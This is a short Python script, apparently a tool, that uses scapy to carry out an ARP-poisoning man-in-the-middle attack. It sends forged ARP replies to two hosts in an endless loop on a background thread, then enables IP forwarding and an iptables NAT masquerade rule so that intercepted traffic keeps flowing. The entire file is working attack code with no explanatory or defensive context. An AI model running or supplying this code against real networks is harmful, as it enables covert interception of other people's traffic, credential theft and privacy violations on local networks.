from scapy.all import ARP, Ether, sendp, conf
import os
import threading

conf.promisc = True


def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def enable_nat():
    os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")


def arp_poison(ip_src: str, mac_src: str, ip_dst: str, mac_dst: str):
    arp_replay_1 = ARP(op=2, pdst=ip_dst, psrc=ip_src, hwdst=mac_dst)
    arp_replay_2 = ARP(op=2, pdst=ip_src, psrc=ip_dst, hwdst=mac_src)
    while True:
        sendp(Ether()/arp_replay_1, verbose=False, inter=2, count=1)
        sendp(Ether()/arp_replay_2, verbose=False, inter=2, count=1)


def arp_poisoning(ip_src: str, mac_src: str, ip_dst: str, mac_dst: str):
    frame_arp = threading.Thread(target=arp_poison, args=(ip_src, mac_src, ip_dst, mac_dst))
    frame_arp.start()


def mitm(ip_src: str, mac_src: str, ip_dst: str, mac_dst: str):
    arp_poisoning(ip_src, mac_src, ip_dst, mac_dst)
    enable_ip_forwarding()
    enable_nat()
